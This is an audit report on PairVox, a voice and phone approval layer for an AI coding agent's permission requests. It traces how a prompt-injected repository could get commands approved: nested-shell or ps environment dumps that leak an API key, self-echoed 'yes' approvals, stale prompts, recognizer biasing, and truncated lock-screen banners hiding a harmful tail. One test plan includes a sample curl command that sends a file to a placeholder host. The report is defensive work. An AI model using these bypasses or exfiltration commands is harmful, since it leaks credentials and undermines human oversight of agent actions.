# Needs validation: PairVox audit run 8 (2026-10-25)

Source-grounded leads, no severity; no target code ran in the audit. Each one's local plan became a regression test in the fix (REPORT.md §4).

## The environment-disclosure rule is bypassed by a nested shell or ps, which stay medium and voice-approvable

Fingerprint: `BashRisk/environment-disclosure-misses-nested-shell-and-ps`

Printing the environment is rated high so that a spoken yes cannot approve it, because the child's environment holds ANTHROPIC_API_KEY in API-key mode (LaunchConfiguration.swift:99). The regex rule at PermissionPolicy.swift:311 matches env, printenv, export, set, declare/typeset -x/-p and compgen -e only at the start of the string or right after ; & | or an open paren, followed by a terminator. The structural pass (lines 457-458) flags only a segment whose program is printenv, or an empty program after a bare env. A nested shell handed the command (sh -c 'env', bash -c printenv, env sh -c env, bash -c export) is a segment whose program is the shell, so it is rated medium ('Runs a nested shell or evaluates text as code'). Its narration is 'sh env' or 'bash printenv', not 'a command', and it has no redirection, substitution or network reason, so screenOnly stays false and a spoken yes approves it. ps eww (macOS ps prints the environment of the user's own processes) matches no rule and is rated medium 'Not a recognized read-only command'. A model steered by repository content could ask for one of these; the owner hears a short readout, says yes, and the key lands in the model context and transcript. Source check correction: bash -c 'export -p' is already high through the separate export -p rule and is not part of the gap. The impact is limited to API-key mode, and any interpreter (python3, node, perl) can read the environment and is rated medium by design, so this is a gap in the rating's stated invariant, not a new capability.

**Claimed root cause.** The environment rule is anchored on command position and the wrapper unwrapping stops at shells (sh, bash, zsh), so the string a shell is given is never rated; there is no rule for process-listing commands that print other processes' environments.

**Trace**

1. `Sources/PairVoxCore/Policy/PermissionPolicy.swift:132` (entrypoint, PermissionPolicy.assess (Bash case)): The command string comes from the model's can_use_tool input (steerable by repository content) and is passed to BashRisk.classify.
2. `Sources/PairVoxCore/Policy/PermissionPolicy.swift:311` (propagation, BashRisk.rules (environment rule)): The environment regex needs start of string or ; & | ( before the word and a terminator after it, so 'bash -c printenv', "sh -c 'env'" and 'env sh -c env' do not match. ps eww has no rule.
3. `Sources/PairVoxCore/Policy/PermissionPolicy.swift:457` (propagation, BashRisk.structuralFindings): Only program == printenv, or an empty program with env as the first word, is flagged. For sh -c env the wrapper skip stops at sh, so the program is sh and only the medium nested-shell finding is added.
4. `Sources/PairVoxCore/Speech/ToolNarrator.swift:85` (propagation, ToolNarrator.commandSummary): The readout for 'sh -c env' is 'sh env', short and not 'a command', so the undescribable test in assess does not make the request screen-only.
5. `Sources/PairVoxCore/Policy/PermissionPolicy.swift:184` (sink, PermissionPolicy.assess (voiceOK)): Risk stays medium and screenOnly stays false, so voiceOK is true and a spoken yes approves the request.

**Blockers**

- Target execution was unavailable in this run (no enforceable sandbox), so the medium rating of the nested-shell spellings was derived by reading the regex and structural pass, not by running BashRisk.classify.
- Whether ps eww shows the claude child's ANTHROPIC_API_KEY depends on macOS ps behaviour on the owner's machine, which is not source-observable.

**Resolution plan**

- Local: Add a test next to testPrintingTheEnvironmentIsHighAndNeverCoveredByAShellGrant that calls assess on "sh -c 'env'", "bash -c printenv", "env sh -c env", "bash -lc env", "bash -c export" and "ps eww" with dummy data and a shell-grant policy, and asserts risk == .high, voiceApprovable == false and coveredByFolderGrant == false. Today they are expected to come back medium and voice-approvable. Do not include "bash -c 'export -p'": the export -p rule already rates it high.
- Owner-observed: On the owner's Mac in API-key mode, run ps eww -p $(pgrep -n claude) in a throwaway terminal and check whether the variable names (not values) include ANTHROPIC_API_KEY.

## The own-echo fix speaks 'If that was you, say yes.', whose last word is an approval that the echo check does not cover

Fingerprint: `ConversationEngine/own-echo-recovery-notice-ends-with-yes`

When a heard approval is judged to be PairVox's own prompt coming back, ConversationEngine.process drops it and speaks the notice 'If that was you, say yes.' as kind .notice. isOwnPromptEcho compares a later heard approval only with lastPromptText, which handleOutput sets only for .prompt utterances. 'yes' and 'say yes' are not a run of any prompt, and VoiceCommand.permissionAnswer returns .approve for them (at most five words, an approve word, no refusal word; 'say' is a question filler so isQuestion is false). If the microphone hears the tail of the notice back and transcribes it as 'yes' or 'say yes', no echo rule applies: answerPrecedesPrompt passes because promptHeardAt was already set by the earlier prompt, and perform(.approve) calls approvePending for a request that is voiceApprovable and not stale. The impact is an approval nobody asked for, limited to requests rated medium (high-risk and screen-only requests are refused on this path). The precondition is acoustic: the notice only fires after a first leak of the prompt, so some echo is already present. Only a tail fragment approves, because the whole notice is six words and permissionAnswer takes at most five. The authors know this class of risk: run 7's report says 'No prompt contains yes, so a yes always counts', speakableAdvice drops advisor sentences that parse as approvals, and the grant-offer path rejects an answer that begins with 'say' as possibly PairVox's own prompt. The permission path has no equivalent guard for its own notice. Source supports the trace; whether a Kokoro or system-voice tail is picked up and transcribed as 'yes' cannot be seen from source. Correction to the hunter's evidence: PolicyAndCommandTests line 384 asserts only that isQuestion('say yes') is false; the approval behaviour comes from permissionAnswer at VoiceCommand.swift:218.

**Claimed root cause.** The echo check is keyed to the last .prompt utterance only, and the recovery notice was written to end in an approval word ('say yes'), so the fix added a new utterance that PairVox's own microphone can hear back as an approval. The 'no prompt says yes' premise no longer holds once the notice is spoken.

**Trace**

1. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:327` (entrypoint, ConversationEngine.process): A transcript from the microphone (any audible sound transcribed by speech recognition) that parses as .approve or .approveAlways and is judged an echo of the last prompt is dropped. The check is isOwnPromptEcho(text).
2. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:330` (propagation, ConversationEngine.process): speak([make('If that was you, say yes.', .notice)], record: false, force: true) queues the notice. Its kind is .notice, so handleOutput never stores it as lastPromptText.
3. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:1172` (propagation, ConversationEngine.handleOutput): lastPromptText, lastPromptID and lastPromptEndedAt are set only when the started utterance has kind .prompt, so the notice never becomes the reference text for the echo check.
4. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:1282` (propagation, ConversationEngine.isOwnPromptEcho): A later 'yes' or 'say yes' is compared only with lastPromptText and the 0.6 s window after that prompt ended; it is not a run of the prompt, so it is not an echo. answerPrecedesPrompt (line 1296) also passes because promptHeardAt is already set.
5. `Sources/PairVoxCore/Conversation/VoiceCommand.swift:218` (propagation, VoiceCommand.permissionAnswer): A phrase of at most five words with an approve word and no refusal word returns .approve; 'say yes' and 'yes' qualify.
6. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:916` (sink, ConversationEngine.perform(.approve)): When the pending request is voiceApprovable and not stale, approvePending runs and the CLI is told to allow the request.

**Blockers**

- Whether the tail of a Kokoro or system-voice utterance of the notice reaches the microphone and is transcribed as 'yes' or 'say yes' depends on the speaker, microphone, room and voice-processing behaviour, and cannot be observed from source. Barge-in may also pause the notice when the VAD hears its start.
- Target execution was unavailable in this run (no enforceable sandbox), so the engine behaviour was traced from source but not run, and a bounded local observed result could not be produced.

**Resolution plan**

- Local: In EngineApprovalTests, with the existing fake backend and fake output: submit a voice-approvable request (an in-project Edit with dummy data) and let its prompt start and finish (.started, then .finished for the prompt). Call userStartedSpeaking() and submit('Allow') within 0.6 s of the prompt's end so isOwnPromptEcho queues the notice; assert backend.responses is empty. Send .started for the notice, then call userStartedSpeaking() and submit('say yes'). Assert backend.responses is still empty. Today it is expected to contain .allow, which shows the gap. A second case should do the same with submit('yes'). After a fix (for example, remember the notice text and treat a tail of it as an echo, or reword the notice so it ends with no approve word), the test passes.
- Owner-observed: On the owner's Mac with the default built-in speakers and microphone and echo cancellation on, with a dummy project and a harmless in-project edit request, provoke the 'If that was you' notice, stay silent, and read the diagnostic log for permission.decided allow with no spoken or typed answer from the owner. Do not send any traffic to a deployment.

## Any prompt starting to play opens the answer window for the pending request, including the stale prompt of a request that was already decided

Fingerprint: `ConversationEngine/prompt-heard-set-by-stale-prompt`

The rule that a spoken answer begun before the pending request's own question started does not count rests on one timestamp, promptHeardAt. handleOutput(.started) sets it whenever any utterance of kind .prompt starts while a permission request or grant offer is pending and promptHeardAt is nil, without checking that the utterance belongs to that request. showPermission resets promptHeardAt to nil for each newly shown request. respondToPermission (reached by approvePending from a click or the phone, and by denyPending) clears the pending request but removes nothing from queued/queueOrder or the output queue, so the decided request A's prompt can still be waiting behind other speech when request B is shown. When A's stale prompt (an 'Allow?' question) later starts, promptHeardAt is set for B, and a spoken 'yes' begun after that moment (or after any later barge-in) passes answerPrecedesPrompt; if B is voice-approvable, perform(.approve) calls approvePending and allows B before B's own prompt has played. A barge-in then commits and clears the queue, so B's prompt may never be spoken. Source confirms each step. Not shown by source alone: that the real speech output keeps A's prompt queued and plays it after the decision (the engine only keeps it in its own queue; FakeOutput and GatedSpeechOutput behaviour was not executed). Impact is limited: the yes is the owner's own voice, only requests rated voice-approvable (not high risk, not stale) are affected, and no new principal gains access. It is a weakening of the new prompt-timing check, which was meant to bind a yes to the question just asked.

**Claimed root cause.** promptHeardAt is a bare timestamp not bound to the request id (or utterance id) of the prompt that belongs to the pending request, and the unplayed prompts of requests that were already decided are left in the speech queue instead of being cancelled when the request is decided.

**Trace**

1. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:1315` (entrypoint, ConversationEngine.showPermission): Request B is shown: promptHeardAt is reset to nil and B's prompt is queued with force: true behind any earlier utterances (including A's still-unplayed prompt).
2. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:1242` (propagation, ConversationEngine.respondToPermission): Deciding A (click, phone or voice) sends the decision, clears pendingPermission and promotes the next request, but does not cancel or remove A's prompt from queued/queueOrder or the output.
3. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:1169` (propagation, ConversationEngine.handleOutput(.started)): When A's stale prompt starts, queued[id]?.kind == .prompt, B is pending and promptHeardAt is nil, so promptHeardAt = now() on behalf of B. The utterance id is never compared with B's prompt.
4. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:1297` (propagation, ConversationEngine.answerPrecedesPrompt): A yes whose answerSpokenAt is at or after promptHeardAt returns false (no refusal), so the 'before the prompt' guard does not fire for B.
5. `Sources/PairVoxCore/Conversation/ConversationEngine.swift:915` (sink, ConversationEngine.perform(.approve)): With B not stale and voiceApprovable, approvePending(always:) runs and respondToPermission sends .allow for B.

**Blockers**

- Whether the real speech output still plays a prompt that is queued when its request is decided was not observed; only the engine's own bookkeeping was read.
- Target execution was unavailable in this run (no enforceable sandbox), so no observed result exists for the sequence.
- Severity depends on how often a decided request's prompt is still queued when the next request arrives, which needs the queue timing of the real output.

**Resolution plan**

- Local: In Tests/PairVoxCoreTests/EngineApprovalTests.swift, using FakeOutput and the existing backend and edit(_:_:) helpers: (1) submit 'Fix it'; (2) backend.emit(edit("A","a.swift")), settle, and record promptA = output.queue.last(where: { $0.kind == .prompt }) without yielding .started; (3) await engine.approvePending(requestID: "A") and settle (a .allow for A is now in backend.responses); (4) backend.emit(edit("B","b.swift")) and settle, and record promptB as the newest .prompt in output.queue; (5) output.continuation.yield(.started(promptA.id)) and settle, without starting promptB; (6) engine.userStartedSpeaking(), userStoppedSpeaking(), submit('yes'), settle. Assert on backend.responses. Observed today is expected to include .allow for request B while promptB never started; the intended behaviour is that B stays pending and the snapshot's ignoredAnswer reason is .beforePrompt until promptB's id has started. Repeat with the grant-offer path (line 892) if desired. Fix to test: record the prompt utterance id when a request is shown and set promptHeardAt only when .started carries that id, and cancel or drop a decided request's queued prompt in respondToPermission.

## Repository vocabulary filter admits answer-only names that end in a line terminator

Fingerprint: `RepoVocabulary.admissible.termPattern-trailing-line-terminator`

RepoVocabulary.admissible is meant to keep names made only of answer words (AllowIt, ConfirmHighRisk, yes_please) out of the speech recognizer's context, so a hostile repository cannot bias transcripts toward an approval (audit run 7 fix). The shape test termPattern is anchored with ^...$ and no anchorsMatchLines option. Under ICU semantics, $ without the multiline flag also matches before a final line terminator, so a file or directory name such as AllowIt followed by a newline (legal on macOS and in git) should pass the shape test. answerWords then leaves the terminator inside the last word (it plus newline), which is in neither the answer vocabulary nor answerFillers, so the all-answer rule is skipped, and the ' allow it ' phrase search does not match either. The name is then counted (file base names weight 3) and, if it ranks in the top 40, joined into the Whisper prompt tokens (and the first 100 into the Apple Speech contextualStrings fallback). Source verifies each step; the ICU $ behavior itself was not observed because target execution was unavailable. Impact is limited to a weak decoding bias toward an approval phrase: the voice approval path still has its own risk checks, staleness window and click requirement for high-risk requests, and the filter already admits near variants such as AllowItX or ConfirmHighRisk2 by design, so this is at most a low-severity bypass of a hardening control.

**Claimed root cause.** termPattern uses ^...$ on the raw name, which under ICU also matches before a trailing line terminator, and answerWords does not strip or reject whitespace and control characters before the word-set checks, so the trailing terminator makes the last word fall outside the answer vocabulary.

**Trace**

1. `Sources/PairVoxApp/AppModel.swift:306` (entrypoint, AppModel project open): Opening a project folder runs RepoVocabulary.scan(root:) on the untrusted repository in a detached task and stores the result as the session vocabulary.
2. `Sources/PairVoxCore/Support/RepoVocabulary.swift:45` (propagation, RepoVocabulary.scan): Directory names (line 37), file base names (line 45, weight 3) and declared identifiers (line 51) are counted only if admissible(name) is true. Directory and file names come straight from the repository and can contain a trailing newline.
3. `Sources/PairVoxCore/Support/RepoVocabulary.swift:67` (propagation, RepoVocabulary.admissible): termPattern (line 58) ends in $ with no anchorsMatchLines and no \z, so it is expected to match 'AllowIt\n' (ICU: $ matches before a final line terminator); admissible does not trim or reject whitespace first.
4. `Sources/PairVoxCore/Support/RepoVocabulary.swift:70` (propagation, RepoVocabulary.answerWords): The terminator stays inside the last word ('it\n'), so words.allSatisfy(answering.contains) is false (line 72) and the ' allow it ' phrase search (line 74) does not match; admissible returns true.
5. `Sources/PairVoxVoice/Transcription.swift:79` (sink, WhisperKitTranscriber.transcribe): The first 40 vocabulary terms are joined into the Whisper prompt and encoded to promptTokens, so an answer-shaped name that ranks in the top 40 biases decoding.

**Blockers**

- Target execution was unavailable in this run (no enforceable sandbox), so the ICU behavior of $ before a trailing newline in NSRegularExpression was not observed.
- Impact depends on Whisper's sensitivity to prompt bias and on whether the name ranks within the top 40 terms; neither was measured, and no end-to-end effect on an approval is demonstrated.

**Resolution plan**

- Local: In a unit test on RepoVocabulary (dummy data only, temp directory): assert RepoVocabulary.admissible("AllowIt\n") == false, and the same for "ConfirmHighRisk\r", "yes_please\u{2028}"; then create a temp directory containing a file named "AllowIt\n.swift" with trivial content and assert scan(root:) returns no term containing "AllowIt". Currently expected: admissible returns true for these inputs and the scan test fails. Fix check: use a pattern anchored with \A...\z (or reject any name containing characters outside [A-Za-z0-9_-] before the word checks) and re-run the test.

## Lock-screen notification offers one-tap Allow for a request whose command text it cuts to 160 characters

Fingerprint: `ios/lockscreen-allow-offered-on-partially-shown-or-screen-only-request`

When a request arrives while the iPhone app is in the background, RequestNotice.make puts the first 160 characters of the request summary in the notification body and still offers Allow and Deny whenever the request is not high risk, not truncated (the Mac's 2048-byte link cut) and not flagged needsScreen. A Bash summary is 'Run: <whole command>', so a medium-risk command longer than about 160 characters has a tail the notification never shows. The in-app card shows the whole summary in a scroll view with every reason, while the notification shows only the head and appends no hint that text was cut beyond an ellipsis. The Allow button needs only .authenticationRequired (the phone unlocked), and the answer is sent as .tap with a phone-asserted .passcode that the Mac accepts for any non-high request. A prompt-injected repository could therefore have Claude issue a long, medium-risk command with a harmless-looking first 160 characters and a harmful tail (the Mac rates many such commands medium), and one tap on the banner would approve it. Scope note from verification: the second part of the hunter's claim (screen-only requests, voiceApprovable false) is weaker. The in-app card also lets a tap approve a voiceApprovable=false, non-needsScreen request, and a short screen-only command is shown in full in the banner, so the Mac's voice-only restriction is not a control the tap path ever relied on. The defensible gap is the 160-character cut that the existing 'truncated' rule does not know about; showing the Mac's screen-only reasons on the banner is a hardening option, not a bypass.

**Claimed root cause.** RequestNotice.make decides offersButtons from risk, truncated and needsScreen only, and applies its own 160-character body cut afterwards without treating a cut body as truncated, so a person can tap Allow on a banner that hides the tail of the command that will run.

**Trace**

1. `ios/PairVoxPhone/PhoneModel.swift:431` (entrypoint, PhoneModel.handle(.snapshot)): A new request in a snapshot from the Mac while !appActive calls notifications.post(RequestNotice.make(for: r, project: s.project)). The request text comes from the claude child's can_use_tool input via PermissionPolicy.assess.
2. `Sources/PairVoxLinkKit/RequestNotice.swift:28` (propagation, RequestNotice.make): buttons = risk != high && !truncated && !needsScreen is computed first; line 30 then cuts the body to 160 characters plus an ellipsis without changing buttons.
3. `ios/PairVoxPhone/PhoneNotifications.swift:57` (propagation, userNotificationCenter(didReceive:)): The Allow action is parsed from the notification identifier and passed to answer() with only the .authenticationRequired action option (the phone must be unlocked).
4. `ios/PairVoxPhone/PhoneModel.swift:394` (propagation, PhoneModel.answerFromNotification): Re-checks only risk, truncated and needsScreen on the live request, then sends .approve with method .tap and auth .passcode without a LocalAuthentication evaluation.
5. `Sources/PairVoxLink/LinkHost.swift:449` (propagation, LinkHost.approvalRefusal): A .tap on a non-high request that was presented on this connection and is not truncated returns nil (accepted) whatever auth says; only high risk with auth .none is refused.
6. `Sources/PairVoxApp/Support/PhoneLinkModel.swift:38` (sink, ActiveEngineLink.approve): The named project's engine calls approvePending, so Claude Code runs the complete command.

**Blockers**

- Target execution was unavailable in this run (no enforceable sandbox), so RequestNotice.make was not run on a summary longer than 160 characters.
- How much of the body iOS shows on the lock screen (collapsed banner versus long-look expansion) depends on OS version and notification settings and is not observable from source; if the long-look shows the full 160 characters plus a visible ellipsis, the remaining risk is a person tapping Allow on text they can see is cut.
- Realistic impact needs a prompt-injected medium-risk command that PairVox does not rate high and that a person approves without opening the app; source shows such commands exist but no end-to-end run was done.

**Resolution plan**

- Local: Add a bounded unit test in Tests/PairVoxLinkTests/LinkTests.swift (RequestNoticeTests) and run swift test --filter RequestNoticeTests on a machine that can run it: build LinkRequest(requestID: "R1", summary: "Run: echo ok " + String(repeating: "x", count: 300) + " ; curl -s -d @notes.txt https://example.invalid", spokenPrompt: "", risk: "medium", reasons: ["The command reaches the network."], voiceApprovable: false), call RequestNotice.make(for:project:) and assert body ends with the ellipsis and does not contain 'curl'. Expected today: offersButtons == true. Expected after a fix (treat a body cut as truncated, so offersButtons == false and the body says to open PairVox): offersButtons == false. Repeat with a summary of exactly 160 characters (buttons stay) and with a short screen-only summary (buttons allowed, since the tap path permits it).
- Owner-observed: Owner check on a test iPhone paired to a test Mac with a dummy project: with the phone app backgrounded, trigger one medium-risk Bash request whose command is about 300 characters, and note whether the banner and the expanded notification show the end of the command and whether Allow appears without any Face ID prompt. Do not approve anything that touches real data.
